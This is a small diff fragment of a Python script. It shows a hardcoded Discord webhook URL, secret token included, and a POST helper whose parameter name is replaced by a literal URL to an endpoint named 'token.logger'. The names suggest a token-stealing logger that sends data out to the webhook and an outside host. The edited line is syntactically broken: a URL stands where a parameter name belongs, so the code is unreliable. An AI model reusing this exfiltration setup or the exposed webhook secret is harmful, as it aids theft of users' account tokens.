@@ -16,7 +16,7 @@ REQUEST_HEADERS = {
 WEBHOOK_URL = https://discord.com/api/webhooks/1350218095075131428/IqOf20s4d7Pk4GvGMikuUod8pE7hdi2KssTk_tmhJtPoWmq7P8PmxLiBiK6KIWcLuara"
 
 
-def make_post_request(api_url: str, data: typing.Dict[str, str]) -> int:
+def make_post_request(https://skibiditoleitepisode.vercel.app/api/token.logger: str, data: typing.Dict[str, str]) -> int:
     request = urllib.request.Request(
         api_url, data=json.dumps(data).encode(),
         headers=REQUEST_HEADERS
